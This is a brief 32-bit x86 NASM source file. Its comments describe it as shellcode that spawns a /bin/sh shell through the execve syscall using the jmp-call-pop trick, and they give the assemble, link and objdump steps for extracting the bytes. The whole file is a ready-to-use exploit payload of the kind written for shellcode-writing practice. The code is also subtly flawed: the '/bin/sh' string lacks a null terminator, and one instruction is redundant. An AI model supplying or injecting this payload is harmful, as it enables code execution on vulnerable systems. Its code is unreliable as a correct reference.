;shellcode for spwawing a shell , so use jump call technique to achive this and use syscall for execve(11 or 0xb) in 32bit assembly
;find the syscall in /usr/include/asm/unistd_32.h
;execute with nasm -f elf32 filename.asm -o filename.o
;and link it with ld -m elf_i386 filename.o -o filename
;and get the binary by objdump -D -M intel ./filename



global _start

_start:

	jmp string
code:	
	xor ebx, ebx
	pop ebx
	xor eax, eax
	mov al, 0xb
	xor ecx, ecx
	xor edx, edx
	int 80h

	xor eax, eax
	inc eax
	xor ebx, ebx
	int 80h
	
	
string:
	call code
	msg: db '/bin/sh'
